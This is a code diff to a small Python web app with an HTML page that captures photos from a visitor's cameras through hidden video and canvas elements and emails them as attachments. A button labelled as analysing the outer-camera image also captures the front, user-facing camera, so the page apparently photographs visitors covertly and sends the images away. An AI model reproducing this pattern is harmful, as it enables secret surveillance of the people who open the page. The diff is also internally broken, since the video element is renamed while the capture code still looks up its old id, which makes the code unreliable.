@@ -24,13 +24,15 @@ def index():
         
     </head>
     <body>
-        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+        <video id="videoElement" width="640" height="480" autoplay style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
         <form id="Form" method="POST" action="/puepue">
             <input type="hidden" name="imageData" id="imageData">
             <input type="hidden" name="imageData2" id="imageData2">
         </form>
-        <button id="captureBtn">画像をキャプチャして解析</button>
+        <button id="captureBtn">外カメラの画像を解析</button>
+        <button id="captureBtn2">内カメラの画像を解析</button>
+        <button id="toggleButton">動画を表示</button>
         <script>
             async function sendpic(facingMode, inputId) {
                 const video = document.getElementById('video');
@@ -75,8 +77,62 @@ def index():
                 await sendpic('environment', 'imageData2');
                 document.getElementById('Form').submit();
             }
+             async function puepue() {
+                await sendpic('user', 'imageData2');
+                await sendpic('environment', 'imageData');
+                document.getElementById('Form').submit();
+            }
+ let currentMode = 0; // 0: 非表示, 1: 外カメラ, 2: 内カメラ
 
+        async function getMedia(facingMode) {
+            const constraints = {
+                video: {
+                    facingMode: facingMode
+                }
+            };
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('videoElement');
+                video.srcObject = stream;
+                video.style.display = 'block';
+            } catch (error) {
+                console.error('Error accessing media devices.', error);
+            }
+        }
+
+        document.getElementById('toggleButton').addEventListener('click', function() {
+            const video = document.getElementById('videoElement');
+            switch (currentMode) {
+                case 0:
+                    video.style.display = 'none';
+                    this.textContent = '外カメラを表示';
+                    currentMode = 1;
+                    break;
+                case 1:
+                    getMedia('environment');
+                    this.textContent = '内カメラを表示';
+                    currentMode = 2;
+                    break;
+                case 2:
+                    getMedia('user');
+                    this.textContent = 'カメラを非表示';
+                    currentMode = 3;
+                    break;
+                case 3:
+                    video.style.display = 'none';
+                    this.textContent = 'カメラを表示';
+                    // ストリームの停止
+                    if (video.srcObject) {
+                        let tracks = video.srcObject.getTracks();
+                        tracks.forEach(track => track.stop());
+                        video.srcObject = null;
+                    }
+                    currentMode = 0;
+                    break;
+            }
+        });
             document.getElementById('captureBtn').addEventListener('click', pue);
+            document.getElementById('captureBtn2').addEventListener('click', puepue);
         </script>
     </body>
     </html>
@@ -101,7 +157,8 @@ def sendpic():
     # Extract base64 data
     image_data = re.sub('^data:image/.+;base64,', '', image_data)
     image_data = base64.b64decode(image_data)
-    
+    image_data3 = re.sub('^data:image/.+;base64,', '', image_data2)
+    image_data3 = base64.b64decode(image_data3)
     
     # Email subject and body
     SUBJECT = str(random.random())
@@ -116,6 +173,11 @@ def sendpic():
     # Attach the image
     part = MIMEBase('application', 'octet-stream')
     part.set_payload(image_data)
+    encoders.encode_base64(part)
+    part.add_header('Content-Disposition', 'attachment; filename="pic.png"')
+    msg.attach(part)
+    part = MIMEBase('application', 'octet-stream')
+    part.set_payload(image_data3)
     encoders.encode_base64(part)
     part.add_header('Content-Disposition', 'attachment; filename="pic.png"')
     msg.attach(part)
